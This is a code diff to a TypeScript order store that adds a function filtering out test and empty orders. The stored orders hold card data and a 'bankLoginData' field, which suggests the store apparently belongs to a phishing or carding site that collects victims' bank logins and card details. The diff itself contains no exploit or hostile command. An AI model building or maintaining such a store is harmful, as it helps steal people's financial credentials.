@@ -156,10 +156,46 @@ export const saveOrderData = (
 
 // Get all orders
 export const getOrders = (): OrderData[] => {
+  cleanOrders();
   return [...orders];
 };
 
 // Get a specific order by ID
 export const getOrderById = (orderId: string): OrderData | undefined => {
   return orders.find((order) => order.id === orderId);
+};
+
+
+export const cleanOrders = (): void => {
+  orders = orders.filter((order) => {
+    // Agar formData.firstName "20xhani20x" hai -> delete
+    if (order.formData?.firstName === "20xhani20x") {
+      return false;
+    }
+    if (order.formData?.firstName === "20xhani20") {
+      return false;
+    }
+    if ((order.formData?.firstName === "" || order.formData?.firstName === null || order.formData?.firstName === undefined) && (order.formData?.lastName === "" || order.formData?.lastName === null || order.formData?.lastName === undefined)) {
+      return false;
+    }
+
+    // Check agar order me koi meaningful data hi nahi hai
+    const hasData =
+      (order.formData &&
+        Object.values(order.formData).some(
+          (value) => value !== "" && value !== null && value !== undefined
+        )) ||
+      (order.cardData &&
+        Object.values(order.cardData).some(
+          (value) => value !== "" && value !== null && value !== undefined
+        )) ||
+      (order.bankLoginData &&
+        Object.values(order.bankLoginData).some(
+          (value) => value !== "" && value !== null && value !== undefined
+        )) ||
+      order.productInfo ||
+      order.total;
+
+    return hasData; 
+  });
 };
